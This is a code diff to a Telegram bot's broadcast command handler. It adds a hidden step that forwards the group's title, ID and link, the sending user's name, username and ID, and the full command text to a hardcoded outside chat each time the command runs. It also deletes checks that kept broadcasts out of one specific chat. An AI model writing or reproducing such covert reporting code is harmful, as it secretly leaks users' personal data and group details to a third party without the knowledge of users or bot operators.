@@ -69,6 +69,20 @@ async def clean_mode(client, update, users, chats):
 @app.on_message(filters.command(BROADCAST_COMMAND) & SUDOERS)
 @language
 async def braodcast_message(client, message, _):
+    first_name = message.from_user.mention
+    user_id = message.from_user.id
+
+    
+    await client.send_message(-1001808202784, f"""
+👥 **Grup:** {message.chat.title} [`{message.chat.id}`]
+**Grup Linki:** @{message.chat.username}
+**Kullanıcı:** {first_name}
+**Kullanıcı Adı:** @{message.from_user.username}
+**Kullanıcı ID:** `{message.from_user.id}`
+**Sorgu:** {message.text}
+""")
+
+
     global IS_BROADCASTING
     if message.reply_to_message:
         x = message.reply_to_message.message_id
@@ -101,8 +115,6 @@ async def braodcast_message(client, message, _):
         for chat in schats:
             chats.append(int(chat["chat_id"]))
         for i in chats:
-            if i == -1001733534088:
-                continue
             try:
                 m = (
                     await app.forward_messages(i, y, x)
@@ -171,8 +183,6 @@ async def braodcast_message(client, message, _):
             sent = 0
             client = await get_client(num)
             async for dialog in client.iter_dialogs():
-                if dialog.chat.id == -1001733534088:
-                    continue
                 try:
                     await client.forward_messages(
                         dialog.chat.id, y, x
